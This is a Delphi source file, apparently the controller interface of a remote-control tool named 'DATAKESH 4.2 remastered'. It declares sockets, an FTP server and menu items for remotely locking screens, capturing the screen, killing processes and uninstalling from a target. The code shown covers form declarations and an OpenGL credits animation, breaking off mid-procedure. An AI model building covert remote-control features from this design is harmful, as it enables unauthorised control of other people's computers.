unit Unit1;

interface

uses
  Windows, Messages, SysUtils, Variants, Classes, Graphics, Controls, Forms,
  Dialogs, ComCtrls, StdCtrls, ExtCtrls, TFlatButtonUnit, TFlatEditUnit, ScktComp,
  TFlatListBoxUnit, TFlatCheckBoxUnit, Gauges, ShellApi, MSNPopUp, Menus, FtpSrvC,TFlatRadioButtonUnit,
  FtpSrv, jpeg,md5, wsocket, ImgList, ExtDlgs, ole2, IdMappedPortTCP, crc32, psyapi, IdBaseComponent,
  IdComponent, IdTCPServer, opengl, bmp, MiniFMOD, TFlatComboBoxUnit,
  OverbyteIcsWndControl, OverbyteIcsFtpSrv;

  const
  WM_NOTIFYICON  = WM_USER+333;

  Baslik = 'DATAKESH 4.2 remastered';
  Teferruat = 'Last compile: 30.06.2023';
  ENT = #13#10;
  ayardosyasi = 'ayar.dat';

  // zattiri zattiri

  NIF_INFO = $10;
  NIF_MESSAGE = 1;
  NIF_ICON = 2;
  NOTIFYICON_VERSION = 3;
  NIF_TIP = 4;
  NIM_SETVERSION = $00000004;
  NIM_SETFOCUS = $00000003;
  NIIF_INFO = $00000001;
  NIIF_WARNING = $00000002;
  NIIF_ERROR = $00000003;

  NIN_BALLOONSHOW = WM_USER + 2;
  NIN_BALLOONHIDE = WM_USER + 3;
  NIN_BALLOONTIMEOUT = WM_USER + 4;
  NIN_BALLOONUSERCLICK = WM_USER + 5;
  NIN_SELECT = WM_USER + 0;
  NINF_KEY = $1;
  NIN_KEYSELECT = NIN_SELECT or NINF_KEY;
  TRAY_CALLBACK = WM_USER + $7258;

type
PNewNotifyIconData = ^TNewNotifyIconData;
TDUMMYUNIONNAME    = record
 case Integer of
 0: (uTimeout: UINT);
 1: (uVersion: UINT);
end;

TNewNotifyIconData = record
    cbSize: DWORD;
    Wnd: HWND;
    uID: UINT;
    uFlags: UINT;
    uCallbackMessage: UINT;
    hIcon: HICON;
   //Version 5.0 is 128 chars, old ver is 64 chars
    szTip: array [0..127] of Char;
    dwState: DWORD; //Version 5.0
    dwStateMask: DWORD; //Version 5.0
    szInfo: array [0..255] of Char; //Version 5.0
    DUMMYUNIONNAME: TDUMMYUNIONNAME;
    szInfoTitle: array [0..63] of Char; //Version 5.0
    dwInfoFlags: DWORD;   //Version 5.0
end;

type
Teskimod = record
aktif: boolean;
ip: string;
kullanici : string;
sifre: string;
end;

type
  TForm1 = class(TForm)
    ServerSocket1: TServerSocket;
    Memo1: TMemo;
    FlatButton2: TFlatButton;
    FlatEdit2: TFlatEdit;
    FlatButton3: TFlatButton;
    FlatButton6: TFlatButton;
    FlatButton17: TFlatButton;
    FlatButton18: TFlatButton;
    TrackBar1: TTrackBar;
    FlatButton25: TFlatButton;
    FlatButton27: TFlatButton;
    FlatButton33: TFlatButton;
    FlatButton36: TFlatButton;
    FlatButton42: TFlatButton;
    FlatButton43: TFlatButton;
    MSNPopUp1: TMSNPopUp;
    FlatButton29: TFlatButton;
    FlatButton38: TFlatButton;
    FlatButton39: TFlatButton;
    FlatButton48: TFlatButton;
    FlatButton51: TFlatButton;
    ListView1: TListView;
    Timer1: TTimer;
    parla1: TTimer;
    parla2: TTimer;
    Panel1: TPanel;
    Panel2: TPanel;
    FlatCheckBox2: TFlatCheckBox;
    FlatCheckBox1: TFlatCheckBox;
    Panel3: TPanel;
    FlatEdit3: TFlatEdit;
    FlatEdit8: TFlatEdit;
    FlatEdit4: TFlatEdit;
    FlatEdit5: TFlatEdit;
    Panel4: TPanel;
    FlatEdit7: TFlatEdit;
    FlatListBox1: TFlatListBox;
    FlatButton52: TFlatButton;
    FlatCheckBox7: TFlatCheckBox;
    PopupMenu1: TPopupMenu;
    Yenile1: TMenuItem;
    FlatButton4: TFlatButton;
    FlatButton5: TFlatButton;
    Panel6: TPanel;
    FlatCheckBox11: TFlatCheckBox;
    FlatButton1: TFlatButton;
    FlatButton7: TFlatButton;
    FlatEdit9: TFlatEdit;
    FlatButton8: TFlatButton;
    FlatEdit6: TFlatEdit;
    FlatCheckBox13: TFlatCheckBox;
    FlatButton9: TFlatButton;
    FlatButton15: TFlatButton;
    FlatButton16: TFlatButton;
    FlatButton12: TFlatButton;
    Panel7: TPanel;
    Panel5: TPanel;
    Label9: TLabel;
    Label11: TLabel;
    Label12: TLabel;
    Label8: TLabel;
    FlatEdit11: TFlatEdit;
    FlatEdit13: TFlatEdit;
    FlatEdit14: TFlatEdit;
    FlatEdit15: TFlatEdit;
    FlatEdit16: TFlatEdit;
    FlatButton10: TFlatButton;
    FlatButton11: TFlatButton;
    FlatButton13: TFlatButton;
    FlatButton14: TFlatButton;
    FlatButton19: TFlatButton;
    Panel8: TPanel;
    Kullan1: TMenuItem;
    N1: TMenuItem;
    N2: TMenuItem;
    BaglantyKes1: TMenuItem;
    ProgramKapat1: TMenuItem;
    Label13: TLabel;
    Panel9: TPanel;
    FlatButton20: TFlatButton;
    FlatButton21: TFlatButton;
    FlatButton22: TFlatButton;
    FlatButton23: TFlatButton;
    FlatButton24: TFlatButton;
    FlatButton26: TFlatButton;
    Panel10: TPanel;
    FlatButton28: TFlatButton;
    FlatButton30: TFlatButton;
    FlatButton31: TFlatButton;
    FlatButton32: TFlatButton;
    FlatButton34: TFlatButton;
    FlatButton35: TFlatButton;
    FlatButton37: TFlatButton;
    FlatButton40: TFlatButton;
    FlatEdit12: TFlatEdit;
    FlatRadioButton3: TFlatRadioButton;
    FlatRadioButton4: TFlatRadioButton;
    FlatRadioButton5: TFlatRadioButton;
    FlatRadioButton6: TFlatRadioButton;
    FlatEdit17: TFlatEdit;
    Panel11: TPanel;
    FlatButton45: TFlatButton;
    FlatButton41: TFlatButton;
    FlatButton44: TFlatButton;
    Label14: TLabel;
    FlatButton49: TFlatButton;
    SistemdenKaldr1: TMenuItem;
    FlatEdit19: TFlatEdit;
    SoketiKapat1: TMenuItem;
    Panel12: TPanel;
    FlatCheckBox8: TFlatCheckBox;
    FlatCheckBox16: TFlatCheckBox;
    FlatButton55: TFlatButton;
    FlatCheckBox18: TFlatCheckBox;
    Label7: TLabel;
    FtpServer1: TFtpServer;
    Panel14: TPanel;
    ListView3: TListView;
    PopupMenu2: TPopupMenu;
    iptal1: TMenuItem;
    BitmileriTemizle1: TMenuItem;
    mBaglantlarKes1: TMenuItem;
    mBaglantlarKes2: TMenuItem;
    emizle1: TMenuItem;
    Timer2: TTimer;
    PopupMenu4: TPopupMenu;
    Gebert1: TMenuItem;
    MenuItem1: TMenuItem;
    MenuItem2: TMenuItem;
    MenuItem3: TMenuItem;
    Yeniilem1: TMenuItem;
    PopupMenu5: TPopupMenu;
    Kapat1: TMenuItem;
    Flash1: TMenuItem;
    Sakla1: TMenuItem;
    Gster1: TMenuItem;
    MenuItem4: TMenuItem;
    MenuItem5: TMenuItem;
    MenuItem6: TMenuItem;
    Kapat2: TMenuItem;
    FlatCheckBox21: TFlatCheckBox;
    Panel16: TPanel;
    ListBox1: TListBox;
    ListBox2: TListBox;
    Gauge2: TGauge;
    Label3: TLabel;
    FlatButton47: TFlatButton;
    N5: TMenuItem;
    Ping1: TMenuItem;
    FlatCheckBox14: TFlatCheckBox;
    FlatButton50: TFlatButton;
    FlatButton54: TFlatButton;
    ImageList1: TImageList;
    Eylemler1: TMenuItem;
    GrnmeyePencereleriListele1: TMenuItem;
    BalkDegitir1: TMenuItem;
    FlatCheckBox4: TFlatCheckBox;
    PopupMenu3: TPopupMenu;
    asdasd1: TMenuItem;
    Panel15: TPanel;
    Image1: TImage;
    Label1: TLabel;
    IdleBozuluncaHaberVer1: TMenuItem;
    FlatCheckBox10: TFlatCheckBox;
    FlatCheckBox5: TFlatCheckBox;
    DosyaYneticisi1: TMenuItem;
    N4: TMenuItem;
    k1: TMenuItem;
    FlatButton57: TFlatButton;
    ColorDialog1: TColorDialog;
    ColorDialog2: TColorDialog;
    FlatCheckBox12: TFlatCheckBox;
    Label5: TLabel;
    Grntsnal1: TMenuItem;
    Panel13: TPanel;
    Label2: TLabel;
    FlatRadioButton7: TFlatRadioButton;
    FlatRadioButton8: TFlatRadioButton;
    FlatButton46: TFlatButton;
    iptal2: TMenuItem;
    N6: TMenuItem;
    FlatEdit1: TFlatEdit;
    FlatEdit10: TFlatEdit;
    Label4: TLabel;
    FlatEdit18: TFlatEdit;
    Label6: TLabel;
    FlatEdit20: TFlatEdit;
    FlatCheckBox6: TFlatCheckBox;
    Label17: TLabel;
    FlatCheckBox9: TFlatCheckBox;
    FlatCheckBox15: TFlatCheckBox;
    Label18: TLabel;
    FlatEdit24: TFlatEdit;
    Label19: TLabel;
    FlatEdit25: TFlatEdit;
    Label20: TLabel;
    FlatEdit26: TFlatEdit;
    Label21: TLabel;
    FlatEdit27: TFlatEdit;
    FlatButton58: TFlatButton;
    FlatButton59: TFlatButton;
    EkranKapla1: TMenuItem;
    Kilitle1: TMenuItem;
    KilidiA1: TMenuItem;
    N3: TMenuItem;
    FlatButton60: TFlatButton;
    portmap: TIdMappedPortTCP;
    opluindirmeyiiptalet1: TMenuItem;
    HepsineUygula1: TMenuItem;
    BaglantyKes2: TMenuItem;
    ProgramKapat2: TMenuItem;
    Sistemdenkaldr2: TMenuItem;
    IdleBozuluncaUyar1: TMenuItem;
    N7: TMenuItem;
    Label16: TLabel;
    FlatEdit23: TFlatEdit;
    FlatEdit22: TFlatEdit;
    Label15: TLabel;
    Label10: TLabel;
    FlatEdit21: TFlatEdit;
    FlatEdit29: TFlatEdit;
    Label22: TLabel;
    OpenDialog1: TOpenDialog;
    SaveDialog1: TSaveDialog;
    FlatButton56: TFlatButton;
    Panel17: TPanel;
    Label23: TLabel;
    Label24: TLabel;
    FlatButton61: TFlatButton;
    ScrollBox1: TScrollBox;
    Image2: TImage;
    FlatCheckBox3: TFlatCheckBox;
    ClientSocket1: TClientSocket;
    FlatRadioButton1: TFlatRadioButton;
    FlatRadioButton2: TFlatRadioButton;
    Label25: TLabel;
    Image3: TImage;
    FlatButton53: TFlatButton;
    FlatButton62: TFlatButton;
    FlatButton63: TFlatButton;
    Image4: TImage;
    procedure ServerSocket1Accept(Sender: TObject; Socket: TCustomWinSocket);
    procedure ServerSocket1ClientRead(Sender: TObject; Socket: TCustomWinSocket);
    procedure Button2Click(Sender: TObject);
    procedure ServerSocket1ClientDisconnect(Sender: TObject; Socket: TCustomWinSocket);
    procedure Edit2KeyDown(Sender: TObject; var Key: Word; Shift: TShiftState);
    procedure FlatButton3Click(Sender: TObject);
    procedure FlatButton4Click(Sender: TObject);
    procedure FlatButton5Click(Sender: TObject);
    procedure FlatButton6Click(Sender: TObject);
    procedure FlatButton8Click(Sender: TObject);
    procedure FlatButton9Click(Sender: TObject);
    procedure FlatButton10Click(Sender: TObject);
    procedure FlatButton11Click(Sender: TObject);
    procedure FlatButton12Click(Sender: TObject);
    procedure FlatButton13Click(Sender: TObject);
    procedure FlatButton15Click(Sender: TObject);
    procedure FlatButton16Click(Sender: TObject);
    procedure FlatButton19Click(Sender: TObject);
    procedure FlatButton17Click(Sender: TObject);
    procedure FlatButton18Click(Sender: TObject);
    procedure FlatButton20Click(Sender: TObject);
    procedure FlatButton21Click(Sender: TObject);
    procedure FlatButton22Click(Sender: TObject);
    procedure FlatButton23Click(Sender: TObject);
    procedure FlatButton26Click(Sender: TObject);
    procedure FlatButton28Click(Sender: TObject);
    procedure FlatButton29Click(Sender: TObject);
    procedure FlatButton24Click(Sender: TObject);
    procedure FlatButton30Click(Sender: TObject);
    procedure FlatButton32Click(Sender: TObject);
    procedure FlatButton33Click(Sender: TObject);
    procedure yenile;
    procedure Timer1Timer(Sender: TObject);
    procedure FlatButton34Click(Sender: TObject);
    procedure zattiriClick(Sender: TObject);
    procedure FlatButton35Click(Sender: TObject);
    procedure FlatButton36Click(Sender: TObject);
    procedure FlatButton31Click(Sender: TObject);
    procedure FlatButton37Click(Sender: TObject);
    procedure FlatButton40Click(Sender: TObject);
    procedure FormCreate(Sender: TObject);
    procedure FormClose(Sender: TObject; var Action: TCloseAction);
    procedure uyariClick(Sender: TObject);
    procedure ServerSocket1ClientError(Sender: TObject; Socket: TCustomWinSocket; ErrorEvent: TErrorEvent; var ErrorCode: Integer);
    procedure FlatButton44Click(Sender: TObject);
    procedure FlatButton45Click(Sender: TObject);
    procedure FlatButton46Click(Sender: TObject);
    procedure FlatButton47Click(Sender: TObject);
    procedure MSNPopUp1URLClick(Sender: TObject; URL: String);
    procedure FlatButton51Click(Sender: TObject);
    procedure FlatButton52Click(Sender: TObject);
    procedure ListView1DblClick(Sender: TObject);
    procedure FlatButton48Click(Sender: TObject);
    procedure FlatButton39Click(Sender: TObject);
    procedure parla1Timer(Sender: TObject);
    procedure parla2Timer(Sender: TObject);
    procedure Yenile1Click(Sender: TObject);
    procedure FlatButton14Click(Sender: TObject);
    procedure FlatButton1Click(Sender: TObject);
    procedure FlatButton7Click(Sender: TObject);
    procedure FlatEdit19MouseMove(Sender: TObject; Shift: TShiftState; X,Y: Integer);
    procedure ProgramKapat1Click(Sender: TObject);
    procedure BaglantyKes1Click(Sender: TObject);
    procedure ping1Click(Sender: TObject);
    procedure Kullan1Click(Sender: TObject);
    procedure SoketiKapat1Click(Sender: TObject);
    procedure FlatButton55Click(Sender: TObject);
    procedure FormPaint(Sender: TObject);
    procedure FlatCheckBox8Click(Sender: TObject);
    procedure Timer2Timer(Sender: TObject);
    procedure Gebert1Click(Sender: TObject);
    procedure MenuItem2Click(Sender: TObject);
    procedure Yeniilem1Click(Sender: TObject);
    procedure Kapat1Click(Sender: TObject);
    procedure Flash1Click(Sender: TObject);
    procedure Sakla1Click(Sender: TObject);
    procedure Gster1Click(Sender: TObject);
    procedure MenuItem5Click(Sender: TObject);
    procedure Kapat2Click(Sender: TObject);
    procedure FlatButton50Click(Sender: TObject);
    procedure FlatButton54Click(Sender: TObject);
    procedure Button1Click(Sender: TObject);
    procedure FtpServer1StorSessionClosed(Sender: TObject; Client: TFtpCtrlSocket; Data: TWSocket; Error: Word);
    procedure iptal1Click(Sender: TObject);
    procedure ListView3ContextPopup(Sender: TObject; MousePos: TPoint; var Handled: Boolean);
    procedure ListView3DblClick(Sender: TObject);
    procedure BitmileriTemizle1Click(Sender: TObject);
    procedure mBaglantlarKes2Click(Sender: TObject);
    procedure emizle1Click(Sender: TObject);
    procedure GrnmeyePencereleriListele1Click(Sender: TObject);
    procedure BalkDegitir1Click(Sender: TObject);
    procedure IdleBozuluncaHaberVer1Click(Sender: TObject);
    procedure Image1DblClick(Sender: TObject);
    procedure k1Click(Sender: TObject);
    procedure asdasd1Click(Sender: TObject);
    procedure DosyaYneticisi1Click(Sender: TObject);
    procedure ListView1Change(Sender: TObject; Item: TListItem;Change: TItemChange);
    procedure FlatButton41Click(Sender: TObject);
    procedure FlatButton57Click(Sender: TObject);
    procedure FlatEdit15DblClick(Sender: TObject);
    procedure FlatEdit16DblClick(Sender: TObject);
    procedure FlatCheckBox12Click(Sender: TObject);
    procedure FlatButton42Click(Sender: TObject);
    procedure Grntsnal1Click(Sender: TObject);
    procedure FlatCheckBox18Click(Sender: TObject);
    procedure FlatButton43Click(Sender: TObject);
    procedure FlatButton27Click(Sender: TObject);
    procedure FtpServer1RetrSessionConnected(Sender: TObject;Client: TFtpCtrlSocket; Data: TWSocket; Error: Word);
  procedure FlatButton49Click(Sender: TObject);
  procedure iptal2Click(Sender: TObject);
  procedure EkranKapla1Click(Sender: TObject);
  procedure Kilitle1Click(Sender: TObject);
  procedure KilidiA1Click(Sender: TObject);
  procedure FlatButton60Click(Sender: TObject);
  procedure FlatEdit6KeyPress(Sender: TObject; var Key: Char);
  procedure FlatEdit7KeyPress(Sender: TObject; var Key: Char);
  procedure FlatEdit8KeyPress(Sender: TObject; var Key: Char);
  procedure FlatEdit21KeyPress(Sender: TObject; var Key: Char);
  procedure FlatEdit22KeyPress(Sender: TObject; var Key: Char);
  procedure FlatEdit23KeyPress(Sender: TObject; var Key: Char);
  procedure FlatEdit18KeyPress(Sender: TObject; var Key: Char);
  procedure opluindirmeyiiptalet1Click(Sender: TObject);
  procedure SistemdenKaldr1Click(Sender: TObject);
  procedure FlatCheckBox9Click(Sender: TObject);
  procedure FormDestroy(Sender: TObject);
  procedure BaglantyKes2Click(Sender: TObject);
  procedure ProgramKapat2Click(Sender: TObject);
  procedure Sistemdenkaldr2Click(Sender: TObject);
  procedure IdleBozuluncaUyar1Click(Sender: TObject);
  procedure FlatButton58Click(Sender: TObject);
  procedure FlatButton59Click(Sender: TObject);
  procedure FlatButton56Click(Sender: TObject);
  procedure FlatButton38Click(Sender: TObject);
  procedure Panel17Resize(Sender: TObject);
  procedure Panel17MouseMove(Sender: TObject; Shift: TShiftState; X,Y: Integer);
  procedure Panel17MouseDown(Sender: TObject; Button: TMouseButton; Shift: TShiftState; X, Y: Integer);
    procedure FlatEdit7KeyDown(Sender: TObject; var Key: Word;
      Shift: TShiftState);
    procedure FlatButton25Click(Sender: TObject);
    procedure FlatRadioButton8Click(Sender: TObject);
    procedure FlatRadioButton7Click(Sender: TObject);
    procedure FormShow(Sender: TObject);
    procedure ClientSocket1Connect(Sender: TObject;
      Socket: TCustomWinSocket);
    procedure ClientSocket1Read(Sender: TObject; Socket: TCustomWinSocket);
    procedure FlatCheckBox3Click(Sender: TObject);
    procedure ServerSocket1ClientConnect(Sender: TObject;
      Socket: TCustomWinSocket);
    procedure ClientSocket1Error(Sender: TObject; Socket: TCustomWinSocket;
      ErrorEvent: TErrorEvent; var ErrorCode: Integer);
    procedure Image4DblClick(Sender: TObject);
    procedure FlatButton53Click(Sender: TObject);
    procedure FlatButton62Click(Sender: TObject);
    procedure FlatButton63Click(Sender: TObject);
    procedure FtpServer1Authenticate(Sender: TObject;
      Client: TFtpCtrlSocket; UserName, Password: TFtpString;
      var Authenticated: Boolean);
    procedure FtpServer1ChangeDirectory(Sender: TObject;
      Client: TFtpCtrlSocket; Directory: TFtpString; var Allowed: Boolean);
    procedure FtpServer1ClientConnect(Sender: TObject;
      Client: TFtpCtrlSocket; AError: Word);
    procedure FtpServer1ClientDisconnect(Sender: TObject;
      Client: TFtpCtrlSocket; AError: Word);
    procedure FtpServer1MakeDirectory(Sender: TObject;
      Client: TFtpCtrlSocket; Directory: TFtpString; var Allowed: Boolean);
    procedure FtpServer1RetrDataSent(Sender: TObject;
      Client: TFtpCtrlSocket; Data: TWSocket; AError: Word);
    procedure FtpServer1RetrSessionClosed(Sender: TObject;
      Client: TFtpCtrlSocket; Data: TWSocket; AError: Word);
    procedure FtpServer1StorDataAvailable(Sender: TObject;
      Client: TFtpCtrlSocket; Data: TWSocket; Buf: PAnsiChar; Len: Integer;
      AError: Word);
    procedure FtpServer1StorSessionConnected(Sender: TObject;
      Client: TFtpCtrlSocket; Data: TWSocket; AError: Word);
    procedure FtpServer1ValidateDele(Sender: TObject;
      Client: TFtpCtrlSocket; var FilePath: TFtpString;
      var Allowed: Boolean);
    procedure FtpServer1ValidateGet(Sender: TObject;
      Client: TFtpCtrlSocket; var FilePath: TFtpString;
      var Allowed: Boolean);
    procedure FtpServer1ValidatePut(Sender: TObject;
      Client: TFtpCtrlSocket; var FilePath: TFtpString;
      var Allowed: Boolean);
    procedure FtpServer1ValidateRnFr(Sender: TObject;
      Client: TFtpCtrlSocket; var FilePath: TFtpString;
      var Allowed: Boolean);
    procedure FtpServer1ValidateRnTo(Sender: TObject;
      Client: TFtpCtrlSocket; var FilePath: TFtpString;
      var Allowed: Boolean);

 private
  rc : HGLRC;    // Rendering Context
  dc  : HDC;     // Device Context
  ElapsedTime, AppStart, LastTime : DWord;  // Timing variables
  IconData: TNewNotifyIconData;
  procedure WMNCHitTest( var Msg : TWMNCHitTest ); message wm_NCHitTest;

  procedure SysTrayIconMsgHandler(var Msg: TMessage); message TRAY_CALLBACK;
  procedure AddSysTrayIcon;
  procedure balonhedesi(baslik,yazi:string;tur:integer);
  procedure DeleteSysTrayIcon;
  procedure basargibi1;
  procedure basargibi2;
  procedure konsolabasargibi;
  procedure baspanelecekvurbeni;
  procedure varsayilanlar;
  procedure oglbaslat;
  procedure oglkapat;
  procedure glDraw;
  procedure ekran1;
  procedure ekran2;
  procedure ekran3;
  procedure sonsahne;
  procedure alayibaslasin;
  procedure Idle(Sender: TObject; var Done: Boolean);
  public
  sahnedeki,balanti,kasinti,duruntu,basinti : string;
  cmesaj : array[0..200] of string;
  yorumlaiptal,enuygula,calisiomlagn:boolean;
  function onayla(konu:string) : Boolean;
    { Public declarations }
  end;

var
  Form1: TForm1;
  DateTime : TDateTime;
  saat,buf,pcevap,md5sakla : string;
  ygelen,tgelen:integer;
  MsgLen,LenReceive,apaket,bl,bagnanan : Integer;
  ftpizin,aktarimkilidi,butonkapali:boolean;
  bagliolan,say1,say2:integer;
  yorumlanasi,ekrandaki:string;
  ftpsktiretseyi : array[0..9999999] of boolean;
  yetkili : array[0..9999999] of boolean;
  maxpaket,maxsikistirma,zamanasimi:integer;
  fkullanici,fsifre:string;
  ayarstr: array[0..15] of string;
  ayar,kayar,dayar: Tstringlist;
  anatex,babatex,crtex,cr2tex,cr3tex,cr4tex,cr5tex,arkaplan : GLuint;
  animson,alayibitti: boolean;
  MyQuadratic : GLUquadricObj;
  saydimkacgunoldu,sayacaktimamanooldu:glfloat;
  link: string;
  destek:Teskimod;
  animasyon:boolean;

procedure glBindTexture(target: GLenum; texture: GLuint); stdcall; external opengl32;

implementation

uses Unit2, Unit3;

{$R *.dfm}
{$R 'rsrc.res' 'rsrc.rc'}

procedure tform1.alayibaslasin;
begin
panel17.Visible:=true;
AppStart :=GetTickCount();
saydimkacgunoldu:=1;
sayacaktimamanooldu:=1;
XMPlay();
Application.OnIdle := Idle;
end;

procedure muzikbaslat;
begin
XMLoadFromRes('MUZIK', 'PSYCORE');
end;

procedure TForm1.WMNCHitTest( var Msg : TWMNCHitTest );
begin
 inherited;
  if( htClient = Msg.Result )then
    Msg.Result := htCaption;
end;

procedure TForm1.Idle(Sender: TObject; var Done: Boolean);
begin
  Done := FALSE;
  LastTime :=ElapsedTime;
  ElapsedTime :=GetTickCount() - AppStart;      // Calculate Elapsed Time
  ElapsedTime :=(LastTime + ElapsedTime) div 3; // Average it out for smoother movement
  glDraw();
                           // Draw the scene
  sleep(10);
  SwapBuffers(DC);                  // Display the scene
end;

procedure tform1.oglbaslat;
var pfd : TPIXELFORMATDESCRIPTOR;
    pf  : Integer;
begin
dc:=GetDC(panel17.Handle);
pfd.nSize:=sizeof(pfd);
pfd.nVersion:=1;
pfd.dwFlags:=PFD_DRAW_TO_WINDOW or PFD_SUPPORT_OPENGL or PFD_DOUBLEBUFFER or 0;
pfd.iPixelType:=PFD_TYPE_RGBA;      // PFD_TYPE_RGBA or PFD_TYPEINDEX
pfd.cColorBits:=32;
pf :=ChoosePixelFormat(dc, @pfd);   // Returns format that most closely matches above pixel format
SetPixelFormat(dc, pf, @pfd);
rc :=wglCreateContext(dc);    // Rendering Context = window-glCreateContext
wglMakeCurrent(dc,rc);        // Make the DC (Form1) the rendering Context
Panel17Resize(self);

/// ********** init hedesi
glClearColor(0.0, 0.0, 0.0, 0.0); 	   // Black Background
glShadeModel(GL_SMOOTH);                 // Enables Smooth Color Shading
glClearDepth(1.0);                       // Depth Buffer Setup
glDisable(GL_DEPTH_TEST);                // Disable Depth Buffer
glDepthFunc(GL_LESS);		           // The Type Of Depth Test To Do
glBlendFunc(GL_SRC_ALPHA,GL_ONE);        // Set The Blending Function For Translucency
glEnable(GL_BLEND);                      // Turn Blending On
glHint(GL_PERSPECTIVE_CORRECTION_HINT, GL_NICEST);   //Realy Nice perspective calculations
glEnable(GL_TEXTURE_2D);                     // Enable Texture Mapping

LoadTexture('ARKAPLAN', Arkaplan);
LoadTexture('SEKIL1', anatex);
LoadTexture('SEKIL2', babatex);
LoadTexture('CR1', crtex);
LoadTexture('CR2', cr2tex);
LoadTexture('CR3', cr3tex);
LoadTexture('CR4', cr4tex);
LoadTexture('CR5', cr5tex);
MyQuadratic := gluNewQuadric();							// Create A Pointer To The Quadric Object (Return 0 If No Memory) (NEW)
gluQuadricNormals(MyQuadratic, GLU_SMOOTH);			// Create Smooth Normals (NEW)
gluQuadricTexture(MyQuadratic, GL_TRUE);				// Create Texture Coords (NEW)
animasyon:=true;
end;

procedure tform1.oglkapat;
begin
animasyon:=false;
XMStop();
XMFree();
sleep(1);
Application.OnIdle := nil;
ElapsedTime:=0;
AppStart:=0;
LastTime:=0;
sleep(1);
try
glClear(GL_COLOR_BUFFER_BIT or GL_DEPTH_BUFFER_BIT);    // Clear The Screen And The Depth Buffer
glFinish;
glFlush;
wglMakeCurrent(0,0);
wglDeleteContext(rc);
releasedc(panel17.Handle,dc);
except on exception do begin

end;
end;

animson:=false;
alayibitti:=false;
try
ZeroMemory(@anatex, sizeOf(anatex));
ZeroMemory(@babatex, sizeOf(babatex));
ZeroMemory(@crtex, sizeOf(crtex));
ZeroMemory(@cr2tex, sizeOf(cr2tex));
ZeroMemory(@cr3tex, sizeOf(cr3tex));
ZeroMemory(@cr4tex, sizeOf(cr4tex));
ZeroMemory(@cr5tex, sizeOf(cr5tex));
ZeroMemory(@rc, sizeOf(rc));
ZeroMemory(@dc, sizeOf(dc));
except on exception do exit
end;
end;

procedure tform1.ekran1;
var
angle:glfloat;
begin

angle :=(LastTime + ElapsedTIme)/2000 - 0.1;   // provides smoother movement
LastTime := ElapsedTime;

if angle > 1.5 then begin
saydimkacgunoldu :=saydimkacgunoldu-0.01;
angle:=saydimkacgunoldu;
end;

glTranslatef(0.0, 0.0, -5);
    glBindTexture(GL_TEXTURE_2D, anatex);
    glBegin(GL_QUADS);
glColor4f(1,1,1,angle);
       // Front Face
      glNormal3f( 0.0, 0.0, -1.0);
      glTexCoord2f(0.0, 0.0); glVertex3f(-1.0, -1.0,  1.0);
      glTexCoord2f(1.0, 0.0); glVertex3f( 1.0, -1.0,  1.0);
      glTexCoord2f(1.0, 1.0); glVertex3f( 1.0,  1.0,  1.0);
      glTexCoord2f(0.0, 1.0); glVertex3f(-1.0,  1.0,  1.0);
glEnd();
end;

procedure tform1.ekran2;
var
angle2:glfloat;
begin

angle2 :=(LastTime + ElapsedTIme)/2000 - 2.0;   // provides smoother movement
LastTime := ElapsedTime;

if angle2 > 1.6 then begin
sayacaktimamanooldu:=sayacaktimamanooldu-0.01;
angle2:=sayacaktimamanooldu;
end;

glTranslatef(0.0, 0.0, -4.5);
    glBindTexture(GL_TEXTURE_2D, babatex);
    glBegin(GL_QUADS);
    glColor4f(1,1,1,angle2);
       // Front Face
      glNormal3f( 0.0, 0.0, -1.0);
      glTexCoord2f(0.0, 0.0); glVertex3f(-1.0, -1.0,  1.0);
      glTexCoord2f(1.0, 0.0); glVertex3f( 1.0, -1.0,  1.0);
      glTexCoord2f(1.0, 1.0); glVertex3f( 1.0,  1.0,  1.0);
      glTexCoord2f(0.0, 1.0); glVertex3f(-1.0,  1.0,  1.0);
    glEnd();
end;

procedure tform1.ekran3;
var
angle3:glfloat;
begin

angle3 :=(LastTime + ElapsedTIme)/6500 - 2.2;   // provides smoother movement
LastTime := ElapsedTime;

glColor4f(1,1,1,1);
glTranslate(0.0, angle3-2, -5.5);
    glBindTexture(GL_TEXTURE_2D, crtex);
    glBegin(GL_QUADS);
       // Front Face
      glNormal3f( 0.0, 0.0, -1.0);
      glTexCoord2f(0.0, 0.0); glVertex3f(-1.0, -1.0,  1.0);
      glTexCoord2f(1.0, 0.0); glVertex3f( 1.0, -1.0,  1.0);
      glTexCoord2f(1.0, 1.0); glVertex3f( 1.0,  1.0,  1.0);
      glTexCoord2f(0.0, 1.0); glVertex3f(-1.0,  1.0,  1.0);
    glEnd();

glTranslate(0.04, -1.9, 0.0);
    glBindTexture(GL_TEXTURE_2D, cr2tex);
    glBegin(GL_QUADS);
       // Front Face
      glNormal3f( 0.0, 0.0, -1.0);
      glTexCoord2f(0.0, 0.0); glVertex3f(-1.0, -1.0,  1.0);
      glTexCoord2f(1.0, 0.0); glVertex3f( 1.0, -1.0,  1.0);
      glTexCoord2f(1.0, 1.0); glVertex3f( 1.0,  1.0,  1.0);
      glTexCoord2f(0.0, 1.0); glVertex3f(-1.0,  1.0,  1.0);
 glEnd();

glTranslate(0.0, -2.1, 0.0);
    glBindTexture(GL_TEXTURE_2D, cr3tex);
    glBegin(GL_QUADS);
       // Front Face
      glNormal3f( 0.0, 0.0, -1.0);
      glTexCoord2f(0.0, 0.0); glVertex3f(-1.0, -1.0,  1.0);
      glTexCoord2f(1.0, 0.0); glVertex3f( 1.0, -1.0,  1.0);
      glTexCoord2f(1.0, 1.0); glVertex3f( 1.0,  1.0,  1.0);
      glTexCoord2f(0.0, 1.0); glVertex3f(-1.0,  1.0,  1.0);
 glEnd();

 glTranslate(0.0, -2.1, 0.0);
    glBindTexture(GL_TEXTURE_2D, cr4tex);
    glBegin(GL_QUADS);
       // Front Face
      glNormal3f( 0.0, 0.0, -1.0);
      glTexCoord2f(0.0, 0.0); glVertex3f(-1.0, -1.0,  1.0);
      glTexCoord2f(1.0, 0.0); glVertex3f( 1.0, -1.0,  1.0);
      glTexCoord2f(1.0, 1.0); glVertex3f( 1.0,  1.0,  1.0);
      glTexCoord2f(0.0, 1.0); glVertex3f(-1.0,  1.0,  1.0);
 glEnd();

if animson then exit;

 glTranslate(0.0, -2.0, 0.0);
    glBindTexture(GL_TEXTURE_2D, cr5tex);
    glBegin(GL_QUADS);
       // Front Face
      glNormal3f( 0.0, 0.0, -1.0);
      glTexCoord2f(0.0, 0.0); glVertex3f(-1.0, -1.0,  1.0);
      glTexCoord2f(1.0, 0.0); glVertex3f( 1.0, -1.0,  1.0);
      glTexCoord2f(1.0, 1.0); glVertex3f( 1.0,  1.0,  1.0);
